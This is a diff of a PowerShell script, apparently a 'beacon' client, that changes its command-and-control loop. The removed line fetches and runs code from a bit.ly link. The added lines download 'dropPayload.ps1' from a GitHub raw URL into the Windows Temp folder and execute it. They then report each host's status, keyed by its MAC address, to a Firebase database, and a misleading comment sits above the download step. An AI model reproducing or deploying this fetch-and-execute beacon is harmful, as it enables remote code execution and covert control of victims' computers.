@@ -99,7 +99,15 @@ while ($true) {
     }
 
     elseif ($state -eq 2) {
-        IEX (Invoke-WebRequest -Uri "bit.ly/curroneBox" -UseBasicParsing).Content
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri https://raw.githubusercontent.com/snackmasta/beacon/v0.0.1/side-project/dropPayload.ps1 > C:\Windows\Temp\dropPayload.ps1
+        Invoke-Expression -Command "C:\Windows\Temp\dropPayload.ps1"
+        $stateChild = @{
+            "Update" = 1
+        } | ConvertTo-Json
+        # PUT the data to the Firebase Realtime Database
+        Invoke-RestMethod -Uri ('https://curronebox-default-rtdb.asia-southeast1.firebasedatabase.app/clients/' + $primaryAdapter.MacAddress + '.json') -Method PUT -Body $stateChild | Out-Null
+        start-sleep -Seconds 5
     }
 
     elseif ($state -eq 3) {
